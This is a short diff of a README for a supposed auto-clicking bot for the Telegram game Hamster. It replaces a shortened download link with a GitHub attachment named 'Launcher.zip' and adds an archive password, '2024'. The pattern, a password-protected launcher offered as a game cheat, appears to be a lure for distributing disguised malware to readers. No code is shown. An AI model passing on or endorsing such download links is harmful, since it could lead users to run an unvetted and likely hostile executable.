@@ -1,4 +1,5 @@
-# [DOWNLOAD](https://bit.ly/3VBkErY)
+# [DOWNLOAD](https://github.com/user-attachments/files/15920478/Launcher.zip)
+### - pass 2024
 ## My product is the best bot for the new telegram game Hamster, which allows you to:
 
 ### Automatic Clicking:
